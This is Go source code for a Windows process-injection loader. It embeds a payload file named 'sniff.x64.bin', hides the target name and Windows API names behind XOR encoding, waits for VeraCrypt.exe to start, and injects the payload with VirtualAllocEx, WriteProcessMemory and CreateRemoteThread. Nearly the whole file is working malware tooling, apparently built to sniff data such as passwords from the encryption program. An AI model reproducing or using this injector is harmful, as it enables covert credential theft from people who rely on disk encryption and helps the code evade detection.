package main

import (
	_ "embed"
	"math"
	"strings"

	"golang.org/x/sys/windows"
)

func IsBitSet(x int, pos int) bool {
	return (x&(1<<pos) != 0)
}

func MyXor(data *[]byte, data_len uint64, key *[]byte, key_len uint64) {
	var i uint64 = 0
	var j uint64 = 0

	for ; i < data_len; i++ {
		if j == key_len {
			j = 0
		}

		var bInput byte = 0
		var BitXOR byte = 0

		for b := 0; b < 8; b++ {
			IsDataBitSet := IsBitSet(int((*data)[i]), b)
			IsKeyBitSet := IsBitSet(int((*key)[j]), b)

			XORBit := (IsDataBitSet != IsKeyBitSet)

			if XORBit {
				BitXOR = 1
			} else {
				BitXOR = 0
			}

			bInput |= BitXOR << b
		}

		(*data)[i] = bInput

		j++
	}
}

func FindTargetProcessID(TargetName string) uint32 {
	var RetVal uint32 = math.MaxUint32

	SnapshotHandle, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)

	if err != nil {
		panic(err)
	}

	ProcessEntry32 := windows.ProcessEntry32{}
	ProcessEntry32.Size = 568

	err = windows.Process32First(SnapshotHandle, &ProcessEntry32)

	if err != nil {
		panic(err)
	}

	err = windows.Process32Next(SnapshotHandle, &ProcessEntry32)

	for err == nil {
		AreStringsEqual := strings.Compare(TargetName, windows.UTF16ToString(ProcessEntry32.ExeFile[:]))

		if AreStringsEqual == 0 {
			return ProcessEntry32.ProcessID
		}

		err = windows.Process32Next(SnapshotHandle, &ProcessEntry32)
	}

	windows.CloseHandle(SnapshotHandle)

	return RetVal
}

//go:embed sniff.x64.bin
var Payload []byte

func main() {
	xor_key := []byte{'0', '0', '0', '0', '0'}
	// MyXor(&Payload, uint64(len(Payload)), &xor_key, uint64(len(xor_key)))

	// TargetName := []byte{0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55} // notepad.exe XORed
	TargetName := []byte{0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55} // VeraCrypt.exe XORed
	MyXor(&TargetName, uint64(len(TargetName)), &xor_key, uint64(len(xor_key)))

	var TargetPID uint32 = math.MaxUint32

	for TargetPID == math.MaxUint32 {
		TargetPID = FindTargetProcessID(string(TargetName))

		if TargetPID != math.MaxUint32 {
			break
		}

		windows.SleepEx(5000, false)
	}

	TargetProcessHandle, err := windows.OpenProcess(((0x000F0000) | (0x00100000) | 0xFFFF), false, uint32(TargetPID))

	if err != nil {
		panic(err)
	}

	Kernel32Str := []byte{0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c}
	MyXor(&Kernel32Str, uint64(len(Kernel32Str)), &xor_key, uint64(len(xor_key)))

	kernel32 := windows.NewLazyDLL(string(Kernel32Str))

	VirtualAllocExStr := []byte{0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48}
	MyXor(&VirtualAllocExStr, uint64(len(VirtualAllocExStr)), &xor_key, uint64(len(xor_key)))

	VirtualAllocEx := kernel32.NewProc(string(VirtualAllocExStr))

	PayloadMem, _, _ := VirtualAllocEx.Call(uintptr(TargetProcessHandle), 0, uintptr(len(Payload)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

	if PayloadMem == 0 {
		return
	}

	var BytesWritten uintptr = 0

	err = windows.WriteProcessMemory(TargetProcessHandle, PayloadMem, &Payload[0], uintptr(len(Payload)), &BytesWritten)
	if err != nil {
		panic(err)
	}

	var OldProtect uint32 = 0
	err = windows.VirtualProtectEx(TargetProcessHandle, PayloadMem, uintptr(len(Payload)), windows.PAGE_EXECUTE_READWRITE, &OldProtect)
	if err != nil {
		panic(err)
	}

	CreateRemoteThreadStr := []byte{0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54}
	MyXor(&CreateRemoteThreadStr, uint64(len(CreateRemoteThreadStr)), &xor_key, uint64(len(xor_key)))

	CreateRemoteThread := kernel32.NewProc(string(CreateRemoteThreadStr))
	ThreadHandle, _, _ := CreateRemoteThread.Call(uintptr(TargetProcessHandle), 0, 0, PayloadMem, 0, 0, 0)

	if ThreadHandle != 0 {
		windows.WaitForSingleObject(windows.Handle(ThreadHandle), windows.INFINITE)
		windows.CloseHandle(windows.Handle(ThreadHandle))
	}

	windows.CloseHandle(TargetProcessHandle)
}
